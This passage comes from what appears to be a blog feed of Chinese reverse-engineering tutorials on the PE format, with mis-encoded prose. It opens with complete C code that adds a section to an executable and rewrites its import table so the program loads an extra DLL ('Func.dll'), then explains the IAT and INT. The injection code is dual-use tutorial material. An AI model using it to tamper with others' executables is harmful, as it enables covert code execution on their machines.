<span class="hljs-number">4</span> +IMAGE_SIZEOF_FILE_HEADER + FileHeader-&gt;SizeOfOptionalHeader);<br><br><span class="hljs-keyword">if</span> (FOA &lt; OptionalHeader-&gt;SizeOfHeaders)<br>&#123;<br><span class="hljs-keyword">return</span> FOA;<br>&#125;<br><br>   <br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span>;i&lt;FileHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>;i++)&#123;<br>        <span class="hljs-keyword">if</span>(FOA &gt;= SectionHeader-&gt;PointerToRawData&amp;&amp; FOA &lt; (SectionHeader +<span class="hljs-number">1</span>)-&gt;PointerToRawData)&#123;<br>            <br>            DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>            <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            SectionHeader += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚åŒº</span><br>    DWORD offset = FOA - SectionHeader-&gt;PointerToRawData;<br>    <span class="hljs-keyword">return</span> SectionHeader-&gt;VirtualAddress + offset;<br>&#125;<br><br><span class="hljs-type">char</span>* <span class="hljs-title function_">Section_add</span><span class="hljs-params">(FILE* fp,<span class="hljs-type">char</span>* buffer)</span>&#123;<br>    DWORD size =  Size(fp);<br>    DWORD new_size = size + ADD_SIZE ;<br><br>    <span class="hljs-type">char</span>* NewBuffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(new_size);<br>    <span class="hljs-keyword">if</span> (!NewBuffer)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;failed to creat buffer!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-built_in">memset</span>(NewBuffer,<span class="hljs-number">0</span>,new_size);<br>    <span class="hljs-built_in">memcpy</span>(NewBuffer,buffer,size);<br><br>    <span class="hljs-comment">//åˆå§‹åŒ–PEå¤´éƒ¨ä¿¡æ¯</span><br>DosHeader = (PIMAGE_DOS_HEADER)NewBuffer;<br>NTHeader = (PIMAGE_NT_HEADERS)(NewBuffer + DosHeader-&gt;e_lfanew);<br>FILEHeader = (PIMAGE_FILE_HEADER)(NewBuffer+DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//æœ€åä¸€ä¸ªèŠ‚è¡¨åœ°å€</span><br>PIMAGE_SECTION_HEADER LastSection = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader+IMAGE_SIZEOF_SECTION_HEADER*(FILEHeader-&gt;NumberOfSections<span class="hljs-number">-1</span>));<br><span class="hljs-comment">//æ–°èŠ‚è¡¨åœ°å€</span><br>PIMAGE_SECTION_HEADER NewSection = (PIMAGE_SECTION_HEADER)(NewBuffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader + IMAGE_SIZEOF_SECTION_HEADER * (FILEHeader-&gt;NumberOfSections));<br><br>    <span class="hljs-comment">//åˆ¤æ–­å‰©ä½™ç©ºé—´</span><br>    DWORD Remained_size = (DWORD)(OptionalHeader-&gt;SizeOfHeaders - DosHeader-&gt;e_lfanew - <span class="hljs-number">4</span><br>- IMAGE_SIZEOF_FILE_HEADER - IMAGE_SIZEOF_SECTION_HEADER * FILEHeader-&gt;NumberOfSections);<br><span class="hljs-keyword">if</span> (Remained_size &lt; <span class="hljs-number">2</span> * IMAGE_SIZEOF_SECTION_HEADER)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do not have enough space!\n&quot;</span>);<br><span class="hljs-built_in">free</span>(NewBuffer);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>    <span class="hljs-comment">//===================ä¿®æ”¹ä¿¡æ¯====================</span><br><span class="hljs-comment">//å…¶ä»–å¤´éƒ¨éœ€è¦ä¿®æ”¹çš„ä¿¡æ¯</span><br>FILEHeader-&gt;NumberOfSections += <span class="hljs-number">1</span>;<br>    OptionalHeader-&gt;SizeOfImage += ADD_SIZE;<br>    <br>    <span class="hljs-comment">//å¡«å…¥æ•°æ®</span><br>    <span class="hljs-built_in">memcpy</span>(NewSection-&gt;Name,<span class="hljs-string">&quot;.NewSec&quot;</span>,<span class="hljs-number">8</span>);<br>    NewSection-&gt;Misc.VirtualSize = ADD_SIZE;<br>    NewSection-&gt;SizeOfRawData = ADD_SIZE;<br>    NewSection-&gt;PointerToRawData = LastSection-&gt;PointerToRawData + LastSection-&gt;SizeOfRawData;<br><br>DWORD add_size = LastSection-&gt;Misc.VirtualSize &gt; LastSection-&gt;SizeOfRawData ? LastSection-&gt;Misc.VirtualSize : LastSection-&gt;SizeOfRawData;<br><br>    NewSection-&gt;VirtualAddress = LastSection-&gt;VirtualAddress + add_size;<br><br>    <span class="hljs-comment">//æ‰¾åˆ°å¼€å§‹çš„åœ°æ–¹</span><br>    <span class="hljs-keyword">if</span> (NewSection-&gt;VirtualAddress % OptionalHeader-&gt;SectionAlignment)<br>&#123;<br>NewSection-&gt;VirtualAddress = NewSection-&gt;VirtualAddress / OptionalHeader-&gt;SectionAlignment * OptionalHeader-&gt;SectionAlignment +OptionalHeader-&gt;SectionAlignment;<br>&#125;<br><br>NewSection-&gt;Characteristics = <span class="hljs-number">0xC0000040</span>;<br><br>    <span class="hljs-keyword">return</span> NewBuffer;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">DLL_INJECT</span><span class="hljs-params">(<span class="hljs-type">char</span>* Buffer)</span>&#123;<br>    PIMAGE_DOS_HEADER DosHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_NT_HEADERS NTHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_FILE_HEADER FILEHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_OPTIONAL_HEADER32 OptionalHeader = <span class="hljs-literal">NULL</span>;<br>PIMAGE_SECTION_HEADER SectionHeader = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">//åˆå§‹åŒ–PEå¤´éƒ¨ä¿¡æ¯</span><br>DosHeader = (PIMAGE_DOS_HEADER)Buffer;<br>NTHeader = (PIMAGE_NT_HEADERS)(Buffer + DosHeader-&gt;e_lfanew);<br>FILEHeader = (PIMAGE_FILE_HEADER)(Buffer+DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span>);<br>OptionalHeader = (PIMAGE_OPTIONAL_HEADER32)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER);<br>SectionHeader = (PIMAGE_SECTION_HEADER)(Buffer + DosHeader-&gt;e_lfanew + <span class="hljs-number">4</span> + IMAGE_SIZEOF_FILE_HEADER + FILEHeader-&gt;SizeOfOptionalHeader);<br><br>    <span class="hljs-comment">//å®šä½åˆ°æ–°èŠ‚åŒºå¼€å§‹</span><br>    PIMAGE_SECTION_HEADER NewSec = SectionHeader + FILEHeader-&gt;NumberOfSections - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span>* pNewSec = Buffer + NewSec-&gt;PointerToRawData;<br>    <span class="hljs-comment">//å®šä½åˆ°å¯¼å…¥è¡¨</span><br>    DWORD Import_Rva = OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;<br>    DWORD Import_Foa = RVA_TO_FOA(Import_Rva,Buffer);<br>   <br>    PIMAGE_IMPORT_DESCRIPTOR pImport_Table =(PIMAGE_IMPORT_DESCRIPTOR)(Buffer + Import_Foa);<br>    <span class="hljs-comment">// printf(&quot;%d&quot;,OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);</span><br><br>    <span class="hljs-comment">//å¤åˆ¶åŸå¯¼å…¥è¡¨</span><br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span>(pImport_Table-&gt;FirstThunk)&#123;<br>        <span class="hljs-built_in">memcpy</span>(pNewSec + <span class="hljs-number">20</span>*index,(pImport_Table),<span class="hljs-number">20</span>);<br>        pImport_Table++;<br>        index++;<br>    &#125;<br><br>    <br>    <span class="hljs-comment">//æŒ‡å‘æ–°å¤åˆ¶å¯¼å…¥è¡¨ç»“æŸ</span><br>    PIMAGE_IMPORT_DESCRIPTOR New_Import = PIMAGE_IMPORT_DESCRIPTOR(pNewSec + index * <span class="hljs-number">20</span>);<br><br>    <span class="hljs-comment">//æ–°å¢INTè¡¨ï¼ŒåŠ 40å³æ˜¯é¢„ç•™20å­—èŠ‚ä½œä¸ºå¯¼å…¥è¡¨ç»“æŸæ ‡å¿—</span><br>    DWORD* New_INT = (DWORD*)(pNewSec + index * <span class="hljs-number">20</span>+ <span class="hljs-number">40</span>);<br>    <span class="hljs-comment">//æ–°å¢IATè¡¨ï¼ŒåŠ 48å³æ˜¯é¢„ç•™4å­—èŠ‚ä½œä¸ºINTç»“æŸæ ‡å¿—</span><br>    DWORD* New_IAT =(DWORD*)(pNewSec + index * <span class="hljs-number">20</span> + <span class="hljs-number">48</span>);<br><br>    <span class="hljs-comment">//æ–°å¢IMAGE_IMPORT_BY_NAMEç»“æ„ï¼ŒåŠ 56åŒç†</span><br>    PIMAGE_IMPORT_BY_NAME New_NAME = PIMAGE_IMPORT_BY_NAME(pNewSec + index * <span class="hljs-number">20</span> + <span class="hljs-number">56</span>);<br><br>    <span class="hljs-comment">//è¿™é‡Œçš„åç§°ä¸€å®šè¦æ˜¯DLLä¸­å¯¼å‡ºçš„åç§°ï¼Œå¦åˆ™ç¨‹åºæ— æ³•æ­£å¸¸è¿è¡Œ</span><br>    <span class="hljs-built_in">memcpy</span>(New_NAME-&gt;Name,<span class="hljs-string">&quot;_add&quot;</span>,<span class="hljs-number">4</span>);<br><br>    <span class="hljs-comment">//è®¾ç½®æ–°INTã€IATè¡¨æŒ‡å‘ï¼Œä½¿å…¶æŒ‡å‘PIMAGE_IMPORT_BY_NAMEç»“æ„ï¼Œä¹Ÿå°±æ˜¯å³åŠéƒ¨åˆ†çš„ç®­å¤´</span><br>    *New_INT = FOA_TO_RVA((<span class="hljs-type">char</span>*)New_NAME - Buffer,Buffer);<br>    <br>    *New_IAT = FOA_TO_RVA((<span class="hljs-type">char</span>*)New_NAME - Buffer,Buffer);<br><br>    <span class="hljs-comment">//è®¾ç½®å¯¼å…¥è¡¨çš„æŒ‡å‘å…³ç³»ï¼Œä½¿å…¶æŒ‡å‘æ–°INTè¡¨ã€IATè¡¨ï¼Œä¹Ÿå°±æ˜¯å·¦åŠéƒ¨åˆ†çš„ç®­å¤´</span><br>    New_Import-&gt;OriginalFirstThunk = FOA_TO_RVA(((<span class="hljs-type">char</span>*)New_INT - Buffer),Buffer);<br>    New_Import-&gt;FirstThunk = FOA_TO_RVA((<span class="hljs-type">char</span>*)New_IAT - Buffer,Buffer);<br><br>    <span class="hljs-comment">//è¿™é‡ŒåŠ 100æ˜¯éšæ„çš„</span><br>    <span class="hljs-type">char</span>* New_DLL_NAME = pNewSec + index * <span class="hljs-number">20</span> + <span class="hljs-number">100</span>;<br>    <span class="hljs-built_in">memcpy</span>(New_DLL_NAME,<span class="hljs-string">&quot;Func.dll&quot;</span>,<span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">//å¯¼å…¥è¡¨çš„NAMEæˆå‘˜å­˜å‚¨çš„æ˜¯DLLåç§°çš„RVAï¼Œè€ŒéNAMEæœ¬èº«</span><br>    New_Import-&gt;Name = FOA_TO_RVA(New_DLL_NAME - Buffer,Buffer);<br><br><span class="hljs-comment">//ä¿®æ”¹ç›®å½•é¡¹ï¼Œä½¿å…¶æŒ‡å‘æ–°å¯¼å…¥è¡¨</span><br>    OptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = NewSec-&gt;VirtualAddress;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span>* buffer;<br>    <span class="hljs-type">char</span>* new_buffer;<br><br>    FILE* fp1 = <span class="hljs-literal">NULL</span>;<br>    FILE* fp2 = <span class="hljs-literal">NULL</span>;<br>    <br>    <span class="hljs-type">errno_t</span> err_1 = fopen_s(&amp;fp1, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\T.exe&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-type">errno_t</span> err_2 = fopen_s(&amp;fp2, <span class="hljs-string">&quot;C:\\Users\\yongrin\\Desktop\\Test_Test.exe&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br><br>    DWORD size = Size(fp1);<br>    buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(size);<br>    fread(buffer,size,<span class="hljs-number">1</span>,fp1);<br><br>    new_buffer = Section_add(fp1,buffer);<br>    DLL_INJECT(new_buffer);<br><br>    fwrite(new_buffer,size+ADD_SIZE,<span class="hljs-number">1</span>,fp2);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;   <br>&#125;<br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Reverse</category>
      
      <category>PE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
      <tag>PE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PEæ–‡ä»¶ç»“æ„ï¼ˆåï¼‰</title>
    <link href="/2023/07/15/PE_9/"/>
    <url>/2023/07/15/PE_9/</url>
    
    <content type="html"><![CDATA[<p>IATè¡¨ã€INTè¡¨ã€å¯¼å…¥è¡¨</p><span id="more"></span><h2 id="å›é¡¾"><a href="#å›é¡¾" class="headerlink" title="å›é¡¾"></a>å›é¡¾</h2><p>å¯¼å‡ºè¡¨æ˜¯å‘Šè¯‰å…¶ä»–PEæ–‡ä»¶å¯ä»¥å¦‚ä½•æ‰¾åˆ°è‡ªå·±æä¾›çš„å‡½æ•°ï¼Œå®ƒåˆ†ä¸ºåå­—å¯¼å‡ºã€åºå·å¯¼å‡ºï¼Œåˆå„è‡ªå¯¹åº”å‡ å¼ è¡¨ï¼Œåˆ†åˆ«æ˜¯å‡½æ•°åœ°å€è¡¨AddressOfFunctionsã€å‡½æ•°åºå·è¡¨AddressOfNameOrdinalsã€å‡½æ•°åç§°è¡¨AddressOfNamesã€‚</p><p>é‡å®šä½è¡¨é‡Œé¢åˆ™æ˜¯è®°å½•æ‰€æœ‰éœ€è¦ä¿®æ”¹åœ°å€çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯å‘Šè¯‰æ“ä½œç³»ç»Ÿå“ªé‡Œæœ‰åœ°å€éœ€è¦ä¿®æ”¹ã€‚å½“ä¸€ä¸ªPEæ–‡ä»¶æ— æ³•æŒ‰ç…§é¢„è®¡ImageBaseè£…è½½æ—¶å‘æŒ¥ä½œç”¨</p><h2 id="å¯¼å…¥è¡¨"><a href="#å¯¼å…¥è¡¨" class="headerlink" title="å¯¼å…¥è¡¨"></a>å¯¼å…¥è¡¨</h2><p>ä¸€ä¸ªPEæ–‡ä»¶æœ‰å¯¼å‡ºè¡¨ï¼Œè‡ªç„¶å°±æœ‰å¯¼å…¥è¡¨ã€‚å‰è€…æ˜¯å‘Šè¯‰åˆ«äººå¦‚ä½•ç”¨ï¼Œåè€…å°±ç›¸å½“äºå‘Šè¯‰åˆ«äººè‡ªå·±è¦ç”¨ä»€ä¹ˆã€‚å®ƒå¯ä»¥é€šè¿‡OptionalHeaderæ•°æ®ç›®å½•é¡¹çš„ç¬¬äºŒé¡¹æ‰¾åˆ°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142243765.png"></p><p>åŒç†è¿™ä¸ªVirtualAddressä¹Ÿæ˜¯ä¸€ä¸ªRVAï¼Œéœ€è¦è½¬åŒ–ä¸ºFOAåæ‰èƒ½åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°çœŸæ­£çš„å¯¼å…¥è¡¨ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        DWORD   Characteristics;            <br>        DWORD   OriginalFirstThunk; <span class="hljs-comment">// æŒ‡å‘ å¯¼å…¥åç§°è¡¨INTï¼ˆImportNameTableï¼‰çš„RVA</span><br>    &#125; DUMMYUNIONNAME;<br>    DWORD   TimeDateStamp;                  <br>    DWORD   ForwarderChain;                 <br>    DWORD   Name;                   <span class="hljs-comment">// æŒ‡å‘ DLLåç§°çš„åœ°å€ RVA</span><br>    DWORD   FirstThunk;             <span class="hljs-comment">// æŒ‡å‘ å¯¼å…¥åœ°å€è¡¨IATï¼ˆImportAddressTableï¼‰çš„RVA</span><br>&#125; IMAGE_IMPORT_DESCRIPTOR;<br><span class="hljs-keyword">typedef</span> IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>OrginalFirstThunk</code>å’Œ<code>FirstThunk</code>å„è‡ªå†æŒ‡å‘ä¸¤å¼ è¡¨ï¼Œåˆ†åˆ«æ˜¯INTè¡¨å’ŒIATè¡¨ï¼Œ<code>name</code>åˆ™æ˜¯è¦ç”¨åˆ°çš„dllçš„åå­—ã€‚åœ¨è¿›ä¸€æ­¥è§£æIATè¡¨å’ŒINTè¡¨ä¹‹å‰ï¼Œå…ˆåšä¸ªå®éªŒã€‚</p><p>éšä¾¿ä½¿ç”¨è°ƒè¯•å™¨æ‰“å¼€ä¸€ä¸ªPEæ–‡ä»¶ï¼Œåœ¨é‡Œé¢æ‰¾ä¸€æ‰¾ä¸€äº›ä½¿ç”¨äº†ç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142331070.png"></p><p>æ¯”å¦‚è¿™é‡Œï¼Œå®é™…ä¸Šè¿™æ¡æŒ‡ä»¤å°±æ˜¯<code>mov rax ds:[4083b0]</code>ï¼Œåœ¨å†…å­˜ä¸­è½¬å»4083B0è¿™ä¸ªåœ°å€ï¼Œçœ‹çœ‹æ˜¯ä»€ä¹ˆ</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142334814.png"></p><p>ä¹Ÿå°±æ˜¯è¯´4083B0è¿™ä¸ªåœ°å€å­˜æ”¾çš„æ˜¯7FFFE86C3190ï¼Œå€ŸåŠ©äºè°ƒè¯•å™¨å¾ˆæ–¹ä¾¿çš„çŸ¥é“è¿™ä¸ªåœ°å€å°±æ˜¯MessageBoxAçš„å‡½æ•°åœ°å€ï¼Œè¿™æ¡æŒ‡ä»¤ä¹Ÿå°±ç­‰ä»·äºæŠŠMessageBoxaçš„åœ°å€ç»™raxï¼Œç„¶åå†è°ƒç”¨æ­¤å‡½æ•°ã€‚</p><p>è€Œæˆ‘ä»¬åœ¨æ–‡ä»¶ä¸­å»çœ‹çœ‹4083B0è¿™ä¸ªåœ°å€å­˜æ”¾çš„æ˜¯ä»€ä¹ˆå‘¢ï¼ˆè¿™é‡Œè¦å‡å»ImageBaseå¾—åˆ°83B0ï¼ŒåŒæ—¶RVAè½¬æ¢FOAï¼Œæ‰èƒ½åœ¨æ–‡ä»¶ä¸­æ‰¾åˆ°ï¼Œæ­¤åœ°å€åœ¨æ–‡ä»¶ä¸­å¯¹åº”çš„åœ°å€ä¸º37B0</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142341414.png"></p><p>37B0è¿™ä¸ªåœ°å€å­˜æ”¾çš„åˆ™æ˜¯ä¸€ä¸ª86F6ï¼Œå¾ˆæ˜¾ç„¶ä¸è¿è¡Œæ—¶å­˜æ”¾çš„å€¼ä¸ä¸€æ ·ã€‚ç»§ç»­æ·±ç©¶86F6åˆæ˜¯ä»€ä¹ˆï¼Œé¦–å…ˆè¿™æ˜¯ä¸€ä¸ªRVAï¼Œå°†å…¶è½¬æ¢ä¸ºFOAåï¼Œå¾—åˆ°3AF6</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142344785.png"></p><p>å½“åœ¨æ–‡ä»¶ä¸­è½¬å»3AF6æ—¶ï¼Œå°±ä¼šæ„æ–™ä¸­åœ°å‘ç°å±…ç„¶å°±æ˜¯MessageBoxAè¿™ä¸ªå‡½æ•°åå­—ï¼Œè™½ç„¶å‰é¢è¿˜å¸¦äº†E9 01ä¸¤å­—èŠ‚ä¸çŸ¥é“ä»€ä¹ˆä¸œè¥¿ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´åœ¨å†…å­˜ä¸­4083B0å­˜æ”¾çš„æ˜¯MessageBoxAçš„åœ°å€ï¼Œè€Œæ–‡ä»¶ä¸­åˆ™å¯¹åº”å­˜æ”¾çš„æ˜¯MessageBoxAçš„åå­—çš„RVAã€‚æ¢å¥è¯è¯´å­˜æ”¾çš„ä¸œè¥¿ä¸ä¸€æ ·ï¼Œä½†ä¸¤è€…ä¹‹é—´è‚¯å®šæœ‰ä¸€å®šçš„è”ç³»ã€‚å®é™…ä¸Šï¼Œ3AF6å¤„å°±æ˜¯IATè¡¨ä¸­çš„ä¸€é¡¹ã€‚</p><p>ç›®å‰å¯ä»¥æ˜ç¡®çš„æ˜¯IATè¡¨è¿è¡Œå‰è¿è¡Œåç¡®å®ä¼šå‘ç”Ÿå˜åŒ–ï¼Œè¿™å…¶å®å°±è·ŸPEæ–‡ä»¶åŠ è½½è¿‡ç¨‹æœ‰å…³äº†ã€‚</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/202307142354979.png"></p><p>åœ¨PEæ–‡ä»¶åŠ è½½ä¹‹å‰ï¼ŒINTè¡¨å’ŒIATè¡¨æŒ‡å‘åŒä¸€å—åœ°æ–¹ï¼Œæ¢å¥è¯è¯´INTè¡¨å’ŒIATè¡¨åœ¨è¿è¡Œå‰æ˜¯å®Œå…¨ä¸€æ ·çš„ä½†æ˜¯ç‹¬ç«‹çš„ä¸¤å¼ è¡¨ï¼Œåœ¨å¤šæ•°æƒ…å†µä¸‹å®ƒä»¬å¤„äºä¸åŒçš„åœ°å€å¤„ï¼Œä½†æ˜¯å­˜æ”¾ç›¸åŒçš„å€¼ã€‚åœ¨PEæ–‡ä»¶åŠ è½½ä¹‹åï¼Œæ“ä½œç³»ç»Ÿå°±ä¼šæ ¹æ®INTè¡¨å»æ‰¾é‚£äº›å‡½æ•°åœ°å€ï¼Œæ¯”å¦‚MesaageBoxAçš„åœ°å€ï¼Œç„¶åå¡«å…¥IATè¡¨ä¸­ã€‚</p><p>è¿™é‡Œä¸å¦¨ç»†è¯´ä¸€ä¸‹exeæ–‡ä»¶åŠ è½½è¿‡ç¨‹</p><ul><li>é¦–å…ˆæ“ä½œç³»ç»Ÿç»™exeæ–‡ä»¶åˆ†é…4GBçš„è™šæ‹Ÿç©ºé—´ï¼Œç„¶åæŠŠexeæœ¬èº«çš„ä»£ç åŠ è½½åˆ°ImageBaseå¤„ï¼Œé€šå¸¸æ¥è¯´exeæ˜¯é¦–å…ˆåŠ è½½çš„ï¼Œå¾€å¾€éƒ½èƒ½é¢„è®¡åŠ è½½åˆ°ImageBaseå¤„ï¼Œå› æ­¤ä¸éœ€è¦ä½¿ç”¨é‡å®šä½è¡¨ä¿®æ”¹ã€‚</li><li>å…¶æ¬¡ï¼Œæ“ä½œç³»ç»Ÿå¾€4GBç©ºé—´ä¸­åŠ è½½å„ç§DLLæ–‡ä»¶ï¼Œç”±äºDLLæ–‡ä»¶å¾€å¾€ä¼šæœ‰å†²çªï¼Œä¸èƒ½æŒ‰ç…§é¢„è®¡ImageBaseè£…è½½ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨DLLæœ¬èº«æä¾›çš„é‡å®šä½è¡¨ä¿®å¤è‡ªå·±çš„åœ°å€</li><li>å¾…æ‰€æœ‰DLLéƒ½åŠ è½½å¹¶ä¿®å¤å®Œåï¼Œæ“ä½œç³»ç»Ÿæ ¹æ®exeçš„INTè¡¨å»æ‰¾å‡½æ•°åœ°å€ï¼Œæ‰¾åˆ°ä¸€ä¸ªåœ°å€å°±å¡«å…¥IATè¡¨ä¸­ï¼Œéå†å®ŒINTè¡¨ä¹Ÿå°±éå†å®ŒIATè¡¨ï¼Œç”±æ­¤å®Œæˆå¯¹IATè¡¨çš„ä¿®æ”¹ï¼ˆè¿™ä¸ªæ‰¾å‡½æ•°åœ°å€çš„è¿‡ç¨‹ï¼Œå…¶å®å°±æ˜¯è°ƒç”¨GetPrcoAddressè¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬åœ¨æ­¤ä¹‹å‰å®ç°äº†å·®ä¸å¤šçš„ï¼‰</li><li>æ­¤æ—¶INTè¡¨å­˜å‚¨äº†å‡½æ•°åç§°æˆ–è€…åºå·ï¼ŒIATè¡¨å­˜å‚¨äº†å¯¹åº”çš„å‡½æ•°åœ°å€ï¼Œæƒ³è¦ä½¿ç”¨DLLä¸€ä¸ªå‡½æ•°ä¹Ÿå°±ç®€å•äº†ã€‚</li></ul><p>ä¹Ÿå°±æ˜¯è¯´æ–‡ä»¶åŠ è½½å‰åINTè¡¨ä¸å˜ï¼Œæ–‡ä»¶åŠ è½½å‰IATè¡¨å’ŒINTè¡¨ç›¸åŒï¼Œæ–‡ä»¶åŠ è½½åIATè¡¨å‘ç”Ÿå˜åŒ–</p><p>é‚£ä¹ˆINTè¡¨æ˜¯å¦‚ä½•å­˜å‚¨å‡½æ•°åç§°æˆ–è€…åºå·å‘¢ï¼Ÿ</p><p>å…ˆæ¥çœ‹çœ‹INTè¡¨è¡¨é¡¹ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IMAGE_THUNK_DATA32</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>        PBYTE  ForwarderString;<br>        PDWORD Function;<br>        DWORD Ordinal; <span class="hljs-comment">//åºå·</span><br>        PIMAGE_IMPORT_BY_NAME  AddressOfData;<span class="hljs-comment">//æŒ‡å‘IMAGE_IMPORT_BY_NAME</span><br>    &#125; u1;<br>&#125; IMAGE_THUNK_DATA32;<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™æ˜¯ä¸ªè”åˆä½“ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªç»“æ„å®½åº¦æ˜¯4ä¸ªå­—èŠ‚ï¼Œè™½ç„¶çœ‹èµ·æ¥è¿™ä¸ªè”åˆä½“å­˜æ”¾äº†å¾ˆå¤šä¸œè¥¿ã€‚ä½†åˆæœ€ç®€å•çš„æ–¹æ³•åˆ¤æ–­ï¼Œå¦‚æœè¿™4ä¸ªå­—èŠ‚æœ€é«˜ä½æ˜¯1ï¼Œé‚£ä¹ˆå‰©ä¸‹31ä½å°±ä»£è¡¨å‡½æ•°åºå·ï¼›å¦‚æœæœ€é«˜ä½ä¸ä¸º1ï¼Œé‚£ä¹ˆå‰©ä¸‹31ä¸ºå°±ä»£è¡¨ä¸€ä¸ªRVAæŒ‡å‘å¦ä¸€ä¸ªç»“æ„<code>IMAGE_IMPORT_BY_NAME</code>ï¼Œå³<code>if(INT &amp; 0x80000000 == 0x80000000) :åºå·å¯¼å‡º else RVA = IMAGE_IMPORT_BY_NAME</code></p><p>è¿™ä¸ªIMAGE_IMPORT_BY_NAMEç»“æ„ä¹Ÿç®€å•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span 